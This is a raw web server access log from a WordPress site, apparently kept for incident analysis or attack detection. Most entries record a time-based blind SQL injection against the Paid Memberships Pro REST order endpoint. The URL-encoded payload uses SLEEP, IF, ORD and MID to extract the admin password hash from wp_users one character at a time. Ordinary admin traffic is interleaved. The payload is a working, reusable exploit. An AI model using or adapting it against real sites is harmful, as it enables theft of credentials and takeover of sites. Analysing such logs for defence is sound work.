47.53.122.78 - - [05/Sep/2023:02:54:03 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E78%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:54:07 +0000] "GET /wp-admin/ HTTP/1.1" 200 15869 "http://www.sipress.com/index.php/2023/09/05/new-post/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:54:08 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:54:06 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E79%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:09 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C2%2C1%29%29%21%3D80%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:09 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:54:11 +0000] "GET /wp-admin/edit-comments.php HTTP/1.1" 200 14487 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:54:09 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E32%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:12 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E48%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:12 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E40%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:12 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E36%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:54:13 +0000] "GET /wp-admin/upload.php HTTP/1.1" 200 21242 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:54:14 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 592 "http://www.sipress.com/wp-admin/upload.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:54:14 +0000] "GET /wp-admin/edit-comments.php HTTP/1.1" 200 14496 "http://www.sipress.com/wp-admin/upload.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:54:12 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E34%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:54:16 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 15872 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:54:17 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:54:17 +0000] "GET / HTTP/1.1" 200 11587 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:54:17 +0000] "GET / HTTP/1.1" 200 11588 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:54:15 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E35%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:18 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%21%3D36%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:54:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:54:18 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:21 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:21 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E80%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:21 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E72%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:21 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E68%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:21 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E66%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:21 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E65%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:24 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%21%3D66%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:24 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
10.112.25.200 - - [05/Sep/2023:02:54:25 +0000] "GET /index.php/sample-page/ HTTP/1.1" 200 11343 "http://www.sipress.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:54:26 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:54:24 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E32%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:27 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E48%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:30 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E56%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:30 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E52%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:30 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E50%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:31 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E49%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:34 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%21%3D50%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:54:35 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:54:34 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E47%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:37 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E87%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:54:40 +0000] "GET /wp-admin/edit.php?post_type=page HTTP/1.1" 200 12317 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:40 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 578 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:42 +0000] "GET / HTTP/1.1" 200 11604 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:54:40 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E107%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:43 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E117%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:54:43 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:54:43 +0000] "GET / HTTP/1.1" 200 10405 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:54:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:54:44 +0000] "GET /index.php/sample-page/ HTTP/1.1" 200 11374 "http://www.sipress.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:45 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:54:46 +0000] "GET /wp-admin/ HTTP/1.1" 200 16189 "http://www.sipress.com/index.php/sample-page/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:54:43 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E109%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
